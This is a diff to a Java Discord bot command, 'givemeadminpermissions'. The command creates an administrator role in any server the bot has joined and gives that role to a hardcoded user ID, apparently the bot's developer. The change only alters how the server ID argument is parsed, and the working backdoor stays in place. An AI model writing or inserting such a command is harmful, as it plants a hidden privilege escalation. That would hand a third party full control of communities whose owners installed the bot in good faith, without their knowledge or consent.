@@ -13,13 +13,16 @@ import java.awt.*;
 
 public class GiveMeAdminPermissionsCommand extends Command {
     public GiveMeAdminPermissionsCommand() {
-        super("givemeadminpermissions", "`!givemeadminpermissions` :^)", CommandCategory.Flo);
+        super("givemeadminpermissions", ":^)", CommandCategory.Flo);
+        setArgumentTemplate(ArgumentManagerTemplate.builder().add("guild", "Guild-ID", "Die ID des Servers :)", ArgumentManagerTemplate.DiscordType.ID)
+                .setExample("!givemeadminpermissions 447357526997073930")
+                .build());
     }
 
     @Override
     public void process(GuildCommandEvent e) {
-        Guild g = e.getJDA().getGuildById(e.getMessage().getContentDisplay().split(" ")[1]);
-        Role r = g.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").setColor(Color.RED).complete();
+        Guild g = e.getJDA().getGuildById(e.getArguments().getID("guild"));
+        Role r = g.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").complete();
         g.addRoleToMember(Constants.FLOID, r).queue();
         EmbedBuilder builder = new EmbedBuilder();
         builder.setTitle("Succesfully gave admin permission on \"" + g.getName() + "\"!").setColor(Color.RED);
